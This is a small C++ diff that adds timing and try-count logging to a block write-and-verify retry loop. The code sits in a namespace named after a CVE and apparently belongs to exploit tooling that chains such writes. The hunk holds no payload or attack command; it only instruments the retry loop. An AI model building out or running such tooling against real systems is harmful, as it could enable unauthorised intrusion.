@@ -239,6 +239,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                     static_cast<unsigned long long>(request.offset + at),
                     static_cast<unsigned long long>(request.budget_ms));
             std::size_t tries = 0U;
+            const auto block_start = std::chrono::steady_clock::now();
             for (;;) {
                 tries += 1U;
                 if (tries > 1U) {
@@ -253,6 +254,12 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             const auto back = request.access->read(0U, request.width, request.channel, *request.params);
                 if (back.ok() && back.value.size() == request.width &&
                     std::memcmp(back.value.data(), in, request.width) == 0) {
+                    /* How long did this block take, and how many tries? A block that never matches
+                     * burns the whole budget, which is what turns a five second chain into minutes. */
+                    const auto block_us = std::chrono::duration_cast<std::chrono::microseconds>(
+                        std::chrono::steady_clock::now() - block_start).count();
+                    GL_LOGI("block[%zu]: landed tries=%zu took=%lld us", at, tries,
+                            static_cast<long long>(block_us));
                     break;  /* landed：预算内比中 */
                 }
                 if (std::chrono::steady_clock::now() >= verify_deadline) {
